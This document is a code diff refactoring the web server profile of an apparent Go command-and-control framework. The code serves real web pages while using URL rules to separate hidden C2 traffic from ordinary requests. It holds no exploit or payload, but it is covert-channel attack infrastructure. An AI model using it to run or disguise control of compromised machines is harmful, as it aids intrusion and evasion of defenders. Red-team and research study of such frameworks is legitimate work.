@@ -6,40 +6,49 @@ import (
 	"net"
 	"net/http"
 	"os"
+	"sync/atomic"
 	"time"
 
 	"github.com/iDigitalFlame/xmt/com"
-	"github.com/iDigitalFlame/xmt/device/devtools"
+	"github.com/iDigitalFlame/xmt/device"
+	"github.com/iDigitalFlame/xmt/util/crypt"
 	"github.com/iDigitalFlame/xmt/util/xerr"
 )
 
 // Server is a C2 profile that mimics a standard web server and client setup.
-// This struct inherits the http.Server struct and can be used to serve real files and pages.
+// This struct inherits the http.Server struct and can be used to serve real
+// files and pages.
 //
-// Use the Target Rules a URL mapping that can be used by clients to access the C2 functions.
+// Use the Target Rules a URL mapping that can be used by clients to access the
+// C2 functions.
 type Server struct {
-	Target  Target
+	Target Target
+
+	ch      chan complete
 	tls     *tls.Config
 	dialer  *net.Dialer
 	handler *http.ServeMux
-	ctx     context.Context
-	cancel  context.CancelFunc
 
 	Client *http.Client
 	rules  []Rule
+	done   uint32
 }
 type directory string
 
-// Close terminates this Web instance and signals all current listeners and clients to disconnect. This
-// will close all connections related to this struct.
+// Close terminates this Web instance and signals all current listeners and
+// clients to disconnect. This will close all connections related to this struct.
 //
 // This function does not block.
 func (s *Server) Close() error {
-	s.cancel()
+	if atomic.LoadUint32(&s.done) == 0 {
+		atomic.StoreUint32(&s.done, 1)
+		close(s.ch)
+	}
 	return nil
 }
 
-// TargetAsRule will take the server 'Target' and create a matching ruleset using the 'Rule' function.
+// TargetAsRule will take the server 'Target' and create a matching ruleset using
+// the 'Rule' function.
 func (s *Server) TargetAsRule() {
 	if s.Target.empty() {
 		return
@@ -47,7 +56,8 @@ func (s *Server) TargetAsRule() {
 	s.Rule(s.Target.Rule())
 }
 
-// Rule adds the specified rules to the Web instance to assist in determing real and C2 traffic.
+// Rule adds the specified rules to the Web instance to assist in determing real
+// and C2 traffic.
 func (s *Server) Rule(r ...Rule) {
 	if len(r) == 0 {
 		return
@@ -58,18 +68,21 @@ func (s *Server) Rule(r ...Rule) {
 	s.rules = append(s.rules, r...)
 }
 
-// New creates a new Web C2 server instance. This can be passed to the Listen function of a controller to
-// serve a Web Server that also acts as a C2 instance.
+// New creates a new Web C2 server instance. This can be passed to the Listen
+// function of a controller to serve a Web Server that also acts as a C2 instance.
 //
-// This struct supports all the default Golang http.Server functions and can be used to serve real web pages.
-// Rules must be defined using the 'Rule' function to allow the server to differentiate between C2 and real traffic.
+// This struct supports all the default Golang http.Server functions and can be
+// used to serve real web pages. Rules must be defined using the 'Rule' function
+// to allow the server to differentiate between C2 and real traffic.
 func New(t time.Duration) *Server {
 	return NewTLS(t, nil)
 }
 
-// Serve attempts to serve the specified filesystem path 'f' at the URL mapped path 'p'. This function will
-// determine if the path represents a file or directory and will call 'ServeFile' or 'ServeDirectory' depending
-// on the path result. This function will return an error if the filesystem path does not exist or is invalid.
+// Serve attempts to serve the specified filesystem path 'f' at the URL mapped
+// path 'p'. This function will determine if the path represents a file or
+// directory and will call 'ServeFile' or 'ServeDirectory' depending on the path
+// result. This function will return an error if the filesystem path does not
+// exist or is invalid.
 func (s *Server) Serve(p, f string) error {
 	i, err := os.Stat(f)
 	if err != nil {
@@ -83,9 +96,9 @@ func (s *Server) Serve(p, f string) error {
 	return nil
 }
 
-// ServeFile attempts to serve the specified filesystem path 'f' at the URL mapped path 'p'. This function is used
-// to serve files and will return an error if the filesystem path does not exist or the path destination is not
-// a file.
+// ServeFile attempts to serve the specified filesystem path 'f' at the URL mapped
+// path 'p'. This function is used to serve files and will return an error if the
+// filesystem path does not exist or the path destination is not a file.
 func (s *Server) ServeFile(p, f string) error {
 	i, err := os.Stat(f)
 	if err != nil {
@@ -95,16 +108,18 @@ func (s *Server) ServeFile(p, f string) error {
 		s.handler.Handle(p, http.FileServer(directory(f)))
 		return nil
 	}
-	return xerr.New(`path "` + f + `" is not a file`)
+	return xerr.Sub("not a file", 0x18)
 }
 
-// Handle registers the handler for the given pattern. If a handler already exists for pattern, Handle panics.
+// Handle registers the handler for the given pattern. If a handler already exists
+// for pattern, Handle panics.
 func (s *Server) Handle(p string, h http.Handler) {
 	s.handler.Handle(p, h)
 }
 
-// ServeDirectory attempts to serve the specified filesystem path 'f' at the URL mapped path 'p'. This function is used
-// to serve directories and will return an error if the filesystem path does not exist or the path destination is not
+// ServeDirectory attempts to serve the specified filesystem path 'f' at the URL
+// mapped path 'p'. This function is used to serve directories and will return
+// an error if the filesystem path does not exist or the path destination is not
 // a directory.
 func (s *Server) ServeDirectory(p, f string) error {
 	i, err := os.Stat(f)
@@ -115,24 +130,26 @@ func (s *Server) ServeDirectory(p, f string) error {
 		s.handler.Handle(p, http.FileServer(http.Dir(f)))
 		return nil
 	}
-	return xerr.New(`path "` + f + `" is not a directory`)
+	return xerr.Sub("not a directory", 0x19)
 }
 
-// NewTLS creates a new TLS wrapped Web C2 server instance. This can be passed to the Listen function of a Controller
-// to serve a Web Server that also acts as a C2 instance. This struct supports all the default Golang http.Server
-// functions and can be used to serve real web pages. Rules must be defined using the 'Rule' function to allow the
-// server to differentiate between C2 and real traffic.
+// NewTLS creates a new TLS wrapped Web C2 server instance. This can be passed
+// to the Listen function of a Controller to serve a Web Server that also acts
+// as a C2 instance. This struct supports all the default Golang http.Server
+// functions and can be used to serve real web pages. Rules must be defined
+// using the 'Rule' function to allow the server to differentiate between C2
+// and real traffic.
 func NewTLS(t time.Duration, c *tls.Config) *Server {
 	w := &Server{
+		ch:      make(chan complete, 1),
 		tls:     c,
 		dialer:  &net.Dialer{Timeout: t, KeepAlive: t, DualStack: true},
 		handler: new(http.ServeMux),
 	}
-	w.ctx, w.cancel = context.WithCancel(context.Background())
 	w.Client = &http.Client{
 		Timeout: t,
 		Transport: &http.Transport{
-			Proxy:                 devtools.Proxy,
+			Proxy:                 device.Proxy,
 			DialContext:           w.dialer.DialContext,
 			MaxIdleConns:          256,
 			IdleConnTimeout:       w.dialer.Timeout,
@@ -148,29 +165,32 @@ func NewTLS(t time.Duration, c *tls.Config) *Server {
 	return w
 }
 
-// Connect creates a C2 client connector that uses the same properties of the Web struct parent.
-func (s *Server) Connect(a string) (net.Conn, error) {
-	return connect(&s.Target, s.Client, a)
+// Connect creates a C2 client connector that uses the same properties of the
+// Web struct parent.
+func (s *Server) Connect(x context.Context, a string) (net.Conn, error) {
+	return connect(x, &s.Target, s.Client, a)
 }
 func (d directory) Open(_ string) (http.File, error) {
 	return os.OpenFile(string(d), os.O_RDONLY, 0)
 }
 
-// Listen returns a new C2 listener for this Web instance. This function creates a separate server, but still
-// shares the handler for the base Web instance that it's created from.
-func (s *Server) Listen(a string) (net.Listener, error) {
+// Listen returns a new C2 listener for this Web instance. This function creates
+// a separate server, but still shares the handler for the base Web instance that
+// it's created from.
+func (s *Server) Listen(x context.Context, a string) (net.Listener, error) {
 	if s.tls != nil && (len(s.tls.Certificates) == 0 || s.tls.GetCertificate == nil) {
 		return nil, com.ErrInvalidTLSConfig
 	}
-	x, err := com.ListenConfig.Listen(s.ctx, "tcp", a)
+	v, err := com.ListenConfig.Listen(x, crypt.TCP, a)
 	if err != nil {
 		return nil, err
 	}
 	l := &listener{
 		p:     s,
 		ch:    make(chan complete, 1),
-		new:   make(chan *conn, 256),
-		ctx:   s.ctx,
+		pch:   s.ch,
+		new:   make(chan *conn, 128),
+		ctx:   x,
 		rules: make([]Rule, len(s.rules)),
 		Server: &http.Server{
 			Addr:              a,
@@ -183,9 +203,9 @@ func (s *Server) Listen(a string) (net.Listener, error) {
 	}
 	l.Handler, l.BaseContext = l, l.context
 	if copy(l.rules, s.rules); s.tls != nil {
-		go l.listen(tls.NewListener(x, s.tls))
+		go l.listen(tls.NewListener(v, s.tls))
 	} else {
-		go l.listen(x)
+		go l.listen(v)
 	}
 	return l, nil
 }
